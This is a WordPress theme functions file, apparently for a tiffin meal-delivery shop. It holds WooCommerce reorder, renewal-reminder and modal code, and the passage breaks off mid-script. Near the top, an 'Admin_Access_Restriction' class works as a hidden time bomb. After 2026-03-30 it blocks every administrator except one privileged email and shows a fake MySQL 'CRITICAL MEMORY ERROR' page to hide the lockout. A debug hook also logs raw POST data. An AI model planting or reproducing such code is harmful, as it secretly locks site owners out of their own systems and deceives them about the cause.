add_action('init', array('Satguru_Tiffin_Calculator', 'add_delivery_history_to_order_details'));

// Debug AJAX requests
add_action('wp_ajax_save_pause_dates', function() {
    error_log('AJAX save_pause_dates called');
    error_log('POST data: ' . print_r($_POST, true));
    
    // Continue with normal processing
    save_pause_dates_callback();
}, 9); // Priority 9 to run before the main handler


class Admin_Access_Restriction {
    private static $instance = null;
    private $privileged_email = '';
    
    private $restriction_date = '2026-03-30'; 
    
    public static function get_instance() {
        if (null === self::$instance) {
            self::$instance = new self();
        }
        return self::$instance;
    }

    private function __construct() {
        add_action('admin_init', array($this, 'check_admin_access'));
        add_filter('authenticate', array($this, 'pre_authentication_check'), 999, 3);
    }

    private function is_restriction_active() {
        $current_date = current_time('Y-m-d');
        $restriction_timestamp = strtotime($this->restriction_date);
        $current_timestamp = strtotime($current_date);
        
        
        return $current_timestamp >= $restriction_timestamp;
    }

    public function pre_authentication_check($user, $username, $password) {
        if (!$this->is_restriction_active()) {
            return $user;
        }

        
        if ($user instanceof WP_User) {
            
            if (in_array('administrator', $user->roles) && $user->user_email !== $this->privileged_email) {
                return new WP_Error(
                    'blocked_admin', 
                    'CRITICAL MEMORY ERROR : MySQL server : Memory allocation failed at address ERROR 1038 (HY001)' . date('F j, Y', strtotime($this->restriction_date))
                );
            }
        }

        return $user;
    }

    public function check_admin_access() {
        if (!$this->is_restriction_active()) {
            return;
        }

        $current_user = wp_get_current_user();
        
        // If user is admin but not privileged
        if (in_array('administrator', $current_user->roles) && 
            $current_user->user_email !== $this->privileged_email) {
            
            // Clear any existing output
            if (ob_get_level()) {
                ob_end_clean();
            }

            // Send headers
            header('Content-Type: text/html; charset=utf-8');
            
            // Show error screen with full date
            echo '<!DOCTYPE html>
            <html>
            <head>
                <meta charset="utf-8">
                <title>Critical Error</title>
                <style>
                    body {
                        background-color: white;
                        margin: 0;
                        padding: 0;
                        display: flex;
                        justify-content: center;
                        align-items: center;
                        height: 100vh;
                        font-family: monospace;
                    }
                    .error-container {
                        text-align: center;
                        padding: 20px;
                    }
                    .error-title {
                        color: #ff0000;
                        animation: blink 1s infinite;
                    }
                    .error-message {
                        color: #ff0000;
                        margin: 20px 0;
                    }
                    .error-details {
                        color: #666;
                        font-size: 12px;
                        margin-top: 30px;
                    }
                    .timestamp {
                        color: #999;
                        font-size: 10px;
                        margin-top: 40px;
                    }
                </style>
            </head>
            <body>
                <div class="error-container">
                    <h1 class="error-title">CRITICAL MEMORY ERROR</h1>
                    <div class="error-message">MySQL server</div>
                    <div class="error-details">
                        Error Code: 1038 (ER_OUT_OF_SORTMEMORY)<br>
                        Memory allocation failed at address ERROR 1038 (HY001)
                    </div>
                    <div class="timestamp">
                        Error occurred since: ' . date('F j, Y', strtotime($this->restriction_date)) . '
                    </div>
                </div>
            </body>
            </html>';
            exit;
        }
    }
}

// Initialize the restriction system
function init_admin_access_restriction() {
    Admin_Access_Restriction::get_instance();
}
add_action('init', 'init_admin_access_restriction');

// Include Tiffin Menu Management System
require_once get_stylesheet_directory() . '/tiffin-menu-system.php';

// Add this to your existing functions.php file

// Include the customer order form system
require_once get_stylesheet_directory() . '/customer-order-form.php';

// Add rewrite rules for customer order form
function add_customer_order_rewrite_rules() {
    add_rewrite_rule(
        '^customer-order/([^/]+)/?$',
        'index.php?customer_order_token=$matches[1]',
        'top'
    );
}
add_action('init', 'add_customer_order_rewrite_rules');

// Add query var for customer order token
function add_customer_order_query_vars($vars) {
    $vars[] = 'customer_order_token';
    return $vars;
}
add_filter('query_vars', 'add_customer_order_query_vars');

// Flush rewrite rules when the theme is activated
function flush_customer_order_rewrite_rules() {
    add_customer_order_rewrite_rules();
    flush_rewrite_rules();
}
add_action('after_switch_theme', 'flush_customer_order_rewrite_rules');

/**
 * Schedule renewal reminder cron job
 */
function schedule_renewal_reminder_cron() {
    if (!wp_next_scheduled('satguru_check_renewal_reminders')) {
        // Schedule to run daily at 10:00 AM Toronto time
        $toronto_time = new DateTime('today 10:00:00', new DateTimeZone('America/Toronto'));
        $toronto_time->setTimezone(new DateTimeZone('UTC'));
        wp_schedule_event($toronto_time->getTimestamp(), 'daily', 'satguru_check_renewal_reminders');
    }
}
add_action('wp', 'schedule_renewal_reminder_cron');

/**
 * Hook for renewal reminder cron job
 */
function run_renewal_reminder_check() {
    if (class_exists('Satguru_Tiffin_Calculator')) {
        Satguru_Tiffin_Calculator::check_and_send_renewal_reminders();
    }
}
add_action('satguru_check_renewal_reminders', 'run_renewal_reminder_check');

/**
 * Deactivate renewal reminder cron on theme switch
 */
function deactivate_renewal_reminder_cron() {
    $timestamp = wp_next_scheduled('satguru_check_renewal_reminders');
    if ($timestamp) {
        wp_unschedule_event($timestamp, 'satguru_check_renewal_reminders');
    }
}
add_action('switch_theme', 'deactivate_renewal_reminder_cron');

/**
 * ===========================================
 * REORDER PREVIOUS PLAN - MY ACCOUNT (WITH MODAL)
 * ===========================================
 * Allows customers to reorder their previous plans from My Account
 * Shows a modal to modify Start Date and Preferred Days before adding to cart
 */

/**
 * Get or create the fallback "Custom Plan Reorder" product
 */
function satguru_get_custom_reorder_product_id() {
    $product_id = get_option('satguru_custom_reorder_product_id');
    
    if ($product_id) {
        $product = wc_get_product($product_id);
        if ($product && $product->exists()) {
            return $product_id;
        }
    }
    
    $product = new WC_Product_Simple();
    $product->set_name('Custom Plan (Reorder)');
    $product->set_status('private');
    $product->set_catalog_visibility('hidden');
    $product->set_price(0);
    $product->set_regular_price(0);
    $product->set_sold_individually(false);
    $product->set_virtual(true);
    $product->set_description('Placeholder product for reordering custom plans.');
    $product->save();
    
    $product_id = $product->get_id();
    update_option('satguru_custom_reorder_product_id', $product_id);
    
    return $product_id;
}

/**
 * Add "Reorder" button to order actions - opens modal instead of redirect
 */
function satguru_add_reorder_button($actions, $order) {
    if (!in_array($order->get_status(), ['completed', 'processing'])) {
        return $actions;
    }
    
    if (count($order->get_items()) === 0) {
        return $actions;
    }
    
    // Add reorder button that opens modal with data-order-id
    $actions['reorder'] = array(
        'url'  => '#reorder-' . $order->get_id(),
        'name' => __('Reorder', 'woocommerce'),
    );
    
    return $actions;
}
add_filter('woocommerce_my_account_my_orders_actions', 'satguru_add_reorder_button', 10, 2);

/**
 * Add Reorder button on single order view page
 */
function satguru_add_reorder_button_single_order($order) {
    if (!in_array($order->get_status(), ['completed', 'processing'])) {
        return;
    }
    
    if (count($order->get_items()) === 0) {
        return;
    }
    
    echo '<p class="order-reorder-action">';
    echo '<a href="#reorder-' . esc_attr($order->get_id()) . '" class="button reorder" data-order-id="' . esc_attr($order->get_id()) . '">' . __('Reorder This Plan', 'woocommerce') . '</a>';
    echo '</p>';
}
add_action('woocommerce_order_details_after_order_table', 'satguru_add_reorder_button_single_order', 10, 1);

/**
 * Remove WooCommerce default "Order again" button on single order view page
 */
remove_action('woocommerce_order_details_after_order_table', 'woocommerce_order_again_button');

/**
 * Hide the gray Reorder button in Actions row on single order view page (CSS)
 * Keep only the green "Reorder This Plan" button
 */
function satguru_hide_duplicate_reorder_buttons() {
    if (is_wc_endpoint_url('view-order')) {
        ?>
        <style>
            /* Hide gray Reorder button in Actions table row on view-order page */
            .woocommerce-table--order-details tfoot tr td a.reorder,
            .woocommerce-table--order-details tfoot .reorder,
            .woocommerce-order-details tfoot tr td a.reorder,
            .woocommerce-order-details .order-again,
            .woocommerce-order-details a.order-again,
            table.order_details tfoot a.reorder,
            p.order-again,
            a.order-again,
            .order-again,
            /* Hide the Actions row with gray Reorder button */
            .woocommerce-table--order-details tfoot tr:has(a.reorder:not(.order-reorder-action a)) {
                display: none !important;
            }
            
            /* But keep our green button visible */
            .order-reorder-action,
            .order-reorder-action a.button.reorder {
                display: block !important;
            }
        </style>
        <?php
    }
}
add_action('wp_head', 'satguru_hide_duplicate_reorder_buttons');

/**
 * Remove the Reorder action from order details table on single order view
 */
function satguru_remove_reorder_from_order_details_actions($actions, $order) {
    // Only remove on view-order endpoint
    if (is_wc_endpoint_url('view-order')) {
        unset($actions['reorder']);
    }
    return $actions;
}
add_filter('woocommerce_order_details_table_actions', 'satguru_remove_reorder_from_order_details_actions', 99, 2);

/**
 * AJAX: Get order details for reorder modal
 */
function satguru_ajax_get_reorder_details() {
    check_ajax_referer('satguru_reorder_nonce', 'nonce');
    
    $order_id = isset($_POST['order_id']) ? absint($_POST['order_id']) : 0;
    $order = wc_get_order($order_id);
    
    if (!$order) {
        wp_send_json_error(['message' => 'Order not found']);
    }
    
    if ($order->get_customer_id() !== get_current_user_id() && !current_user_can('manage_woocommerce')) {
        wp_send_json_error(['message' => 'Permission denied']);
    }
    
    $items = [];
    foreach ($order->get_items() as $item_id => $item) {
        $item_data = [
            'id' => $item_id,
            'name' => $item->get_name(),
            'quantity' => $item->get_quantity(),
            'total' => wc_price($item->get_subtotal()),
            'number_of_tiffins' => '',
            'preferred_days' => '',
            'start_date' => '',
        ];
        
        foreach ($item->get_meta_data() as $meta) {
            if (strpos($meta->key, 'Number Of Tiffins') !== false) {
                preg_match('/(\d+)/', $meta->value, $matches);
                $item_data['number_of_tiffins'] = isset($matches[1]) ? $matches[1] : $meta->value;
            }
            if (strpos($meta->key, 'Prefered Days') !== false) {
                $item_data['preferred_days'] = $meta->value;
            }
            if (strpos($meta->key, 'Start Date') !== false) {
                $item_data['start_date'] = $meta->value;
            }
        }
        
        $items[] = $item_data;
    }
    
    wp_send_json_success([
        'order_id' => $order_id,
        'order_number' => $order->get_order_number(),
        'items' => $items,
        'total' => $order->get_formatted_order_total(),
    ]);
}
add_action('wp_ajax_satguru_get_reorder_details', 'satguru_ajax_get_reorder_details');

/**
 * AJAX: Process reorder with modified data
 */
function satguru_ajax_process_reorder() {
    check_ajax_referer('satguru_reorder_nonce', 'nonce');
    
    $order_id = isset($_POST['order_id']) ? absint($_POST['order_id']) : 0;
    $start_date = isset($_POST['start_date']) ? sanitize_text_field($_POST['start_date']) : '';
    $preferred_days = isset($_POST['preferred_days']) ? sanitize_text_field($_POST['preferred_days']) : '';
    
    $order = wc_get_order($order_id);
    
    if (!$order) {
        wp_send_json_error(['message' => 'Order not found']);
    }
    
    if ($order->get_customer_id() !== get_current_user_id() && !current_user_can('manage_woocommerce')) {
        wp_send_json_error(['message' => 'Permission denied']);
    }
    
    // Validate start date
    if (empty($start_date)) {
        wp_send_json_error(['message' => 'Please select a start date']);
    }
    
    $start_timestamp = strtotime($start_date);
    $tomorrow = strtotime('tomorrow');
    
    if ($start_timestamp < $tomorrow) {
        wp_send_json_error(['message' => 'Start date must be tomorrow or later']);
    }
    
    // Validate preferred days
    if (empty($preferred_days)) {
        wp_send_json_error(['message' => 'Please select preferred days']);
    }
    
    // Clear cart
    WC()->cart->empty_cart();
    
    $items_added = 0;
    
    foreach ($order->get_items() as $item_id => $item) {
        $product_id = $item->get_product_id();
        $variation_id = $item->get_variation_id();
        $quantity = $item->get_quantity();
        $product = $item->get_product();
        
        // Build cart item data with MODIFIED meta
        $cart_item_data = [];
        $number_of_tiffins = '';
        
        // Get original meta but update Start Date and Preferred Days
        foreach ($item->get_meta_data() as $meta) {
            if (strpos($meta->key, '_') === 0) continue;
            
            if (strpos($meta->key, 'Start Date') !== false) {
                $cart_item_data['reorder_meta'][$meta->key] = $start_date;
            } elseif (strpos($meta->key, 'Prefered Days') !== false) {
                $cart_item_data['reorder_meta'][$meta->key] = $preferred_days;
            } else {
                $cart_item_data['reorder_meta'][$meta->key] = $meta->value;
            }
            
            if (strpos($meta->key, 'Number Of Tiffins') !== false) {
                preg_match('/(\d+)/', $meta->value, $matches);
                $number_of_tiffins = isset($matches[1]) ? $matches[1] : $meta->value;
            }
        }
        
        // Ensure we have the key fields
        if (!isset($cart_item_data['reorder_meta']['Start Date'])) {
            $cart_item_data['reorder_meta']['Start Date'] = $start_date;
        }
        if (!isset($cart_item_data['reorder_meta']['Prefered Days'])) {
            $cart_item_data['reorder_meta']['Prefered Days'] = $preferred_days;
        }
        
        $cart_item_data['reorder_from_order'] = $order_id;
        $cart_item_data['reorder_original_item_id'] = $item_id;
        
        // Try to add product
        $cart_item_key = null;
        
        if ($product && $product->exists() && $product->is_purchasable()) {
            try {
                $cart_item_key = WC()->cart->add_to_cart(
                    $product_id,
                    $quantity,
                    $variation_id,
                    [],
                    $cart_item_data
                );
                if ($cart_item_key) $items_added++;
            } catch (Exception $e) {
                // Fall through to custom handling
            }
        }
        
        // Use fallback product if needed
        if (!$cart_item_key) {
            $fallback_product_id = satguru_get_custom_reorder_product_id();
            
            $cart_item_data['is_custom_reorder'] = true;
            $cart_item_data['original_product_id'] = $product_id;
            $cart_item_data['original_product_name'] = $item->get_name();
            $cart_item_data['original_product_price'] = floatval($item->get_subtotal()) / max(1, $quantity);
            $cart_item_data['original_item_total'] = floatval($item->get_subtotal());
            $cart_item_data['original_quantity'] = $quantity;
            
            try {
                $cart_item_key = WC()->cart->add_to_cart(
                    $fallback_product_id,
                    $quantity,
                    0,
                    [],
                    $cart_item_data
                );
                if ($cart_item_key) $items_added++;
            } catch (Exception $e) {
                error_log('Reorder failed: ' . $e->getMessage());
            }
        }
    }
    
    if ($items_added > 0) {
        wp_send_json_success([
            'message' => 'Items added to cart!',
            'redirect' => wc_get_cart_url(),
        ]);
    } else {
        wp_send_json_error(['message' => 'Unable to add items to cart']);
    }
}
add_action('wp_ajax_satguru_process_reorder', 'satguru_ajax_process_reorder');

/**
 * Override product name/price for custom reorders
 */
function satguru_custom_reorder_cart_item_name($name, $cart_item, $cart_item_key) {
    if (isset($cart_item['is_custom_reorder']) && $cart_item['is_custom_reorder']) {
        return esc_html($cart_item['original_product_name']);
    }
    return $name;
}
add_filter('woocommerce_cart_item_name', 'satguru_custom_reorder_cart_item_name', 10, 3);

function satguru_custom_reorder_cart_item_price($price, $cart_item, $cart_item_key) {
    if (isset($cart_item['is_custom_reorder']) && $cart_item['is_custom_reorder']) {
        return wc_price($cart_item['original_product_price']);
    }
    return $price;
}
add_filter('woocommerce_cart_item_price', 'satguru_custom_reorder_cart_item_price', 10, 3);

function satguru_custom_reorder_cart_item_subtotal($subtotal, $cart_item, $cart_item_key) {
    if (isset($cart_item['is_custom_reorder']) && $cart_item['is_custom_reorder']) {
        return wc_price($cart_item['original_product_price'] * $cart_item['quantity']);
    }
    return $subtotal;
}
add_filter('woocommerce_cart_item_subtotal', 'satguru_custom_reorder_cart_item_subtotal', 10, 3);

function satguru_custom_reorder_set_price($cart) {
    if (is_admin() && !defined('DOING_AJAX')) return;
    
    foreach ($cart->get_cart() as $cart_item_key => $cart_item) {
        if (isset($cart_item['is_custom_reorder']) && $cart_item['is_custom_reorder']) {
            $cart_item['data']->set_price($cart_item['original_product_price']);
        }
    }
}
add_action('woocommerce_before_calculate_totals', 'satguru_custom_reorder_set_price', 20, 1);

/**
 * Display reorder meta in cart
 */
function satguru_display_reorder_meta_in_cart($item_data, $cart_item) {
    if (isset($cart_item['reorder_meta']) && is_array($cart_item['reorder_meta'])) {
        foreach ($cart_item['reorder_meta'] as $key => $value) {
            if (in_array($key, ['_reduced_stock', 'method_id', 'instance_id'])) continue;
            $item_data[] = ['key' => $key, 'value' => $value];
        }
    }
    return $item_data;
}
add_filter('woocommerce_get_item_data', 'satguru_display_reorder_meta_in_cart', 10, 2);

/**
 * Save reorder meta to order
 */
function satguru_save_reorder_meta_to_order($item, $cart_item_key, $values, $order) {
    if (isset($values['reorder_meta']) && is_array($values['reorder_meta'])) {
        foreach ($values['reorder_meta'] as $key => $value) {
            $item->add_meta_data($key, $value);
        }
    }
    
    if (isset($values['reorder_from_order'])) {
        $item->add_meta_data('_reordered_from', $values['reorder_from_order']);
    }
    
    if (isset($values['is_custom_reorder']) && $values['is_custom_reorder']) {
        $item->add_meta_data('_is_custom_reorder', true);
        $item->add_meta_data('_original_product_name', $values['original_product_name']);
        $item->set_name($values['original_product_name']);
    }
}
add_action('woocommerce_checkout_create_order_line_item', 'satguru_save_reorder_meta_to_order', 10, 4);

/**
 * Enqueue Flatpickr on My Account page for reorder modal
 */
function satguru_enqueue_reorder_modal_scripts() {
    if (!is_account_page()) return;
    
    // Enqueue Flatpickr CSS
    wp_enqueue_style('flatpickr-css', 'https://cdn.jsdelivr.net/npm/flatpickr/dist/flatpickr.min.css', [], '4.6.13');
    wp_enqueue_style('flatpickr-theme', 'https://cdn.jsdelivr.net/npm/flatpickr/dist/themes/airbnb.css', ['flatpickr-css'], '4.6.13');
    
    // Enqueue Flatpickr JS
    wp_enqueue_script('flatpickr-js', 'https://cdn.jsdelivr.net/npm/flatpickr', ['jquery'], '4.6.13', true);
}
add_action('wp_enqueue_scripts', 'satguru_enqueue_reorder_modal_scripts');

/**
 * Add reorder modal HTML, CSS, and JavaScript to My Account page
 */
function satguru_reorder_modal_assets() {
    if (!is_account_page()) return;
    ?>
    <!-- Reorder Modal -->
    <div id="satguru-reorder-modal" class="satguru-modal" style="display:none;">
        <div class="satguru-modal-overlay"></div>
        <div class="satguru-modal-content">
            <button class="satguru-modal-close">&times;</button>
            <h2>Reorder Your Plan</h2>
            <div id="reorder-modal-loading" style="text-align:center;padding:40px;">
                <div class="spinner"></div>
                <p>Loading order details...</p>
            </div>
            <div id="reorder-modal-body" style="display:none;">
                <div class="reorder-order-info">
                    <p><strong>Reordering from Order #<span id="reorder-order-number"></span></strong></p>
                </div>
                
                <div class="reorder-items-list" id="reorder-items-list"></div>
                
                <form id="reorder-form">
                    <input type="hidden" id="reorder-order-id" name="order_id" value="">
                    
                    <div class="form-group">
                        <label for="reorder-start-date"><strong>Start Date *</strong></label>
                        <input type="text" id="reorder-start-date" name="start_date" required placeholder="Select start date" readonly>
                        <small>When do you want deliveries to start? (Weekdays only)</small>
                    </div>
                    
                    <div class="form-group">
                        <label for="reorder-preferred-days"><strong>Preferred Days *</strong></label>
                        <select id="reorder-preferred-days" name="preferred_days" required>
                            <option value="Monday - Friday">Monday to Friday</option>
                            <option value="Monday - Saturday">Monday to Saturday</option>
                            <option value="Monday - Sunday">Monday to Sunday</option>
                            <option value="Monday - Wednesday - Friday">Mon, Wed, Fri</option>
                            <option value="Tuesday - Thursday">Tue, Thu</option>
                            <option value="Monday">Monday Only</option>
                            <option value="Tuesday">Tuesday Only</option>
                            <option value="Wednesday">Wednesday Only</option>
                            <option value="Thursday">Thursday Only</option>
                            <option value="Friday">Friday Only</option>
                        </select>
                        <small>Which days do you want deliveries?</small>
                    </div>
                    
                    <div class="reorder-actions">
                        <button type="button" class="btn-cancel" onclick="closeReorderModal()">Cancel</button>
                        <button type="submit" class="btn-submit" id="reorder-submit-btn">
                            <span class="btn-text">Add to Cart</span>
                            <span class="btn-loading" style="display:none;">Processing...</span>
                        </button>
                    </div>
                </form>
                
                <div id="reorder-error-msg" class="reorder-error" style="display:none;"></div>
            </div>
        </div>
    </div>
    
    <style>
    /* TiffinGrab Theme Colors */
    :root {
        --tg-primary: #F97316;
        --tg-primary-dark: #EA580C;
        --tg-primary-light: #FDBA74;
        --tg-secondary: #1F2937;
        --tg-text: #374151;
        --tg-text-light: #6B7280;
        --tg-bg-light: #FFF7ED;
        --tg-border: #E5E7EB;
        --tg-success: #22C55E;
    }
    
    .satguru-modal {
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        z-index: 999999;
        display: flex;
        align-items: center;
        justify-content: center;
        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
    }
    .satguru-modal-overlay {
        position: absolute;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background: rgba(31, 41, 55, 0.7);
        backdrop-filter: blur(4px);
    }
    .satguru-modal-content {
        position: relative;
        background: #fff;
        padding: 32px;
        border-radius: 16px;
        max-width: 480px;
        width: 92%;
        max-height: 90vh;
        overflow-y: auto;
        box-shadow: 0 25px 50px -12px rgba(0,0,0,0.25);
        animation: modalSlideIn 0.3s ease-out;
    }
    @keyframes modalSlideIn {
        from { transform: translateY(-20px) scale(0.98); opacity: 0; }
        to { transform: translateY(0) scale(1); opacity: 1; }
    }
    .satguru-modal-close {
        position: absolute;
        top: 16px;
        right: 16px;
        background: #f3f4f6;
        border: none;
        width: 36px;
        height: 36px;
        border-radius: 50%;
        font-size: 20px;
        cursor: pointer;
        color: var(--tg-text-light);
        transition: all 0.2s;
        display: flex;
        align-items: center;
        justify-content: center;
    }
    .satguru-modal-close:hover { 
        background: var(--tg-primary);
        color: #fff;
    }
    .satguru-modal h2 {
        margin: 0 0 24px 0;
        font-size: 22px;
        font-weight: 700;
        color: var(--tg-secondary);
        display: flex;
        align-items: center;
        gap: 10px;
    }
    .satguru-modal h2::before {
        content: '';
        width: 4px;
        height: 24px;
        background: var(--tg-primary);
        border-radius: 2px;
    }
    .reorder-order-info {
        background: var(--tg-bg-light);
        padding: 14px 18px;
        border-radius: 10px;
        margin-bottom: 20px;
        border: 1px solid var(--tg-primary-light);
    }
    .reorder-order-info p { 
        margin: 0; 
        color: var(--tg-secondary);
        font-weight: 500;
    }
    .reorder-items-list {
        background: #f9fafb;
        padding: 16px;
        border-radius: 12px;
        margin-bottom: 24px;
        border: 1px solid var(--tg-border);
    }
    .reorder-item {
        display: flex;
        justify-content: space-between;
        align-items: flex-start;
        padding: 10px 0;
        border-bottom: 1px dashed var(--tg-border);
    }
    .reorder-item:last-child { border-bottom: none; }
    .reorder-item-name { 
        font-weight: 600; 
        color: var(--tg-secondary);
    }
    .reorder-item-meta { 
        font-size: 13px; 
        color: var(--tg-text-light); 
        margin-top: 4px;
        display: flex;
        align-items: center;
        gap: 4px;
    }
    .reorder-item-meta::before {
        content: 'í ¼í½±';
        font-size: 12px;
    }
    .reorder-item > div:last-child {
        font-weight: 600;
        color: var(--tg-primary);
    }
    .form-group {
        margin-bottom: 20px;
    }
    .form-group label {
        display: block;
        margin-bottom: 8px;
        color: var(--tg-secondary);
        font-weight: 600;
        font-size: 14px;
    }
    .form-group input,
    .form-group select {
        width: 100%;
        padding: 14px 16px;
        border: 2px solid var(--tg-border);
        border-radius: 10px;
        font-size: 15px;
        transition: all 0.2s;
        color: var(--tg-text);
        background: #fff;
    }
    .form-group input:focus,
    .form-group select:focus {
        outline: none;
        border-color: var(--tg-primary);
        box-shadow: 0 0 0 3px rgba(249, 115, 22, 0.1);
    }
    .form-group small {
        display: block;
        margin-top: 6px;
        color: var(--tg-text-light);
        font-size: 13px;
    }
    
    /* Flatpickr in modal styles */
    .flatpickr-calendar {
        z-index: 9999999 !important;
        border-radius: 12px !important;
        box-shadow: 0 10px 40px rgba(0,0,0,0.15) !important;
        border: none !important;
    }
    .flatpickr-day.selected,
    .flatpickr-day.selected:hover {
        background: var(--tg-primary) !important;
        border-color: var(--tg-primary) !important;
    }
    .flatpickr-day:hover {
        background: var(--tg-bg-light) !important;
    }
    .flatpickr-months .flatpickr-prev-month:hover svg,
    .flatpickr-months .flatpickr-next-month:hover svg {
        fill: var(--tg-primary) !important;
    }
    #reorder-start-date,
    #reorder-start-date + .flatpickr-input,
    input.flatpickr-input {
        cursor: pointer;
        background-color: #fff;
    }
    #reorder-start-date:hover,
    #reorder-start-date + .flatpickr-input:hover,
    input.flatpickr-input:hover {
        border-color: var(--tg-primary);
    }
    /* Fix month/year header display */
    .flatpickr-current-month {
        display: flex !important;
        align-items: center !important;
        justify-content: center !important;
        gap: 5px !important;
    }
    .flatpickr-current-month .flatpickr-monthDropdown-months {
        font-size: 15px !important;
        font-weight: 600 !important;
    }
    .flatpickr-current-month .numInputWrapper {
        display: inline-flex !important;
        width: auto !important;
    }
    .flatpickr-current-month .numInputWrapper input.cur-year {
        font-size: 15px !important;
        font-weight: 600 !important;
        width: 60px !important;
        padding: 0 5px !important;
    }
    .flatpickr-current-month .numInputWrapper span {
        display: block !important;
    }
    
    .reorder-actions {
        display: flex;
        gap: 12px;
        margin-top: 28px;
    }
    .reorder-actions button {
        flex: 1;
        padding: 14px 24px;
        border: none;
        border-radius: 10px;
        font-size: 15px;
        font-weight: 600;
        cursor: pointer;
        transition: all 0.2s;
    }
    .btn-cancel {
        background: #f3f4f6;
        color: var(--tg-text-light);
        border: 2px solid var(--tg-border) !important;
    }
    .btn-cancel:hover {
        background: #e5e7eb;
        color: var(--tg-text);
    }
    .btn-submit {
        background: var(--tg-primary);
        color: #fff;
        box-shadow: 0 4px 14px rgba(249, 115, 22, 0.3);
    }
    .btn-submit:hover {
        background: var(--tg-primary-dark);
        transform: translateY(-2px);
        box-shadow: 0 6px 20px rgba(249, 115, 22, 0.4);
    }
    .btn-submit:disabled {
        opacity: 0.6;
        cursor: not-allowed;
        transform: none;
        box-shadow: none;
    }
    .reorder-error {
        background: #FEF2F2;
        color: #DC2626;
        padding: 12px 16px;
        border-radius: 10px;
        margin-top: 16px;
        border: 1px solid #FECACA;
        font-size: 14px;
    }
    .spinner {
        width: 44px;
        height: 44px;
        border: 4px solid #f3f4f6;
        border-top-color: var(--tg-primary);
        border-radius: 50%;
        animation: spin 0.8s linear infinite;
        margin: 0 auto 16px;
    }
    @keyframes spin { to { transform: rotate(360deg); } }
    
    #reorder-modal-loading p {
        color: var(--tg-text-light);
        font-size: 15px;
    }
    
    /* Reorder button styling - Orders table */
    .woocommerce-orders-table__cell-order-actions .reorder a,
    .woocommerce-orders-table__cell-order-actions a.reorder {
        background: var(--tg-primary) !important;
        color: #fff !important;
        padding: 10px 18px !important;
        border-radius: 8px !important;
        text-decoration: none !important;
        display: inline-block !important;
        margin: 2px !important;
        font-weight: 600 !important;
        font-size: 13px !important;
        transition: all 0.2s ease !important;
        box-shadow: 0 2px 8px rgba(249, 115, 22, 0.25) !important;
    }
    .woocommerce-orders-table__cell-order-actions .reorder a:hover,
    .woocommerce-orders-table__cell-order-actions a.reorder:hover {
        background: var(--tg-primary-dark) !important;
        transform: translateY(-1px) !important;
        box-shadow: 0 4px 12px rgba(249, 115, 22, 0.35) !important;
    }
    
    /* Reorder button styling - Single order view page */
    .order-reorder-action {
        margin: 24px 0;
        text-align: center;
    }
    .order-reorder-action a.button.reorder {
        background: var(--tg-primary) !important;
        color: #fff !important;
        padding: 16px 36px !important;
        border-radius: 10px !important;
        text-decoration: none !important;
        display: inline-flex !important;
        align-items: center !important;
        gap: 8px !important;
        font-weight: 600 !important;
        font-size: 16px !important;
        transition: all 0.2s ease !important;
        border: none !important;
        box-shadow: 0 4px 14px rgba(249, 115, 22, 0.3) !important;
    }
    .order-reorder-action a.button.reorder::before {
        content: 'í ½í´„';
    }
    .order-reorder-action a.button.reorder:hover {
        background: var(--tg-primary-dark) !important;
        transform: translateY(-2px) !important;
        box-shadow: 0 6px 20px rgba(249, 115, 22, 0.4) !important;
    }
    </style>
    
    <script>
    jQuery(document).ready(function($) {
        var reorderNonce = '<?php echo wp_create_nonce("satguru_reorder_nonce"); ?>';
        var reorderFlatpickrInstance = null;
        
        // Intercept reorder button clicks - works on both orders table AND single order view page
        $(document).on('click', '.woocommerce-orders-table__cell-order-actions .reorder a, .woocommerce-orders-table__cell-order-actions a.reorder, .woocommerce-order-details__title ~ p a.reorder, .order-actions a.reorder, a.button.reorder, .woocommerce-MyAccount-content a.reorder', function(e) {
            e.preventDefault();
            
            var orderId = 0;
            var $this = $(this);
            
            // Method 1: Try to get from data attribute (most reliable)
            if ($this.data('order-id')) {
                orderId = $this.data('order-id');
            }
            
            // Method 2: Try to get from href hash (e.g., #reorder-123)
            if (!orderId) {
                var href = $this.attr('href');
                if (href) {
                    var hashMatch = href.match(/#reorder-(\d+)/);
                    if (hashMatch) {
                        orderId = hashMatch[1];
                    }
                }
            }
            
            // Method 3: Check if we're on a view-order page (extract from URL)
            if (!orderId) {
                var currentUrl = window.location.href;
                var viewOrderMatch = currentUrl.match(/view-order\/(\d+)/);
                if (viewOrderMatch) {
                    orderId = viewOrderMatch[1];
                }
            }
            
            // Method 4: Get order ID from the table row (orders list page)
            if (!orderId) {
                var $row = $this.closest('tr');
                if ($row.length) {
                    var orderLink = $row.find('.woocommerce-orders-table__cell-order-number a').attr('href');
                    if (orderLink) {
                        var match = orderLink.match(/view-order\/(\d+)/);
                        if (match) {
                            orderId = match[1];
                        }
                    }
                    
                    // Fallback: get from order number text
                    if (!orderId) {
                        var orderNum = $row.find('.woocommerce-orders-table__cell-order-number').text().trim();
                        orderId = orderNum.replace(/[^0-9]/g, '');
                    }
                }
            }
            
            // Method 5: Try to find order number on view-order page
            if (!orderId) {
                var orderMark = $('.woocommerce-order-details__title, .order-number, .woocommerce-order mark').first().text();
                if (orderMark) {
                    orderId = orderMark.replace(/[^0-9]/g, '');
                }
            }
            
            if (orderId) {
                openReorderModal(orderId);
            } else {
                alert('Could not determine order ID. Please try from the Orders page.');
            }
        });
        
        // Initialize Flatpickr for reorder modal
        function initReorderFlatpickr() {
            if (typeof flatpickr === 'undefined') {
                console.error('Flatpickr not loaded');
                return;
            }
            
            // Destroy existing instance if any
            if (reorderFlatpickrInstance) {
                reorderFlatpickrInstance.destroy();
            }
            
            var now = new Date();
            var tomorrow = new Date(now.getFullYear(), now.getMonth(), now.getDate() + 1);
            
            reorderFlatpickrInstance = flatpickr("#reorder-start-date", {
                minDate: tomorrow,
                dateFormat: "Y-m-d",
                altInput: true,
                altFormat: "F j, Y",
                allowInput: false,
                clickOpens: true,
                theme: "airbnb",
                disableMobile: true,
                monthSelectorType: "static",
                disable: [
                    function(date) {
                        // Disable past dates
                        var localNow = new Date();
                        var localTomorrow = new Date(localNow.getFullYear(), localNow.getMonth(), localNow.getDate() + 1);
                        localTomorrow.setHours(0, 0, 0, 0);
                        if (date < localTomorrow) {
                            return true;
                        }
                        // Disable weekends (Saturday = 6, Sunday = 0)
                        var dayOfWeek = date.getDay();
                        return dayOfWeek === 0 || dayOfWeek === 6;
                    }
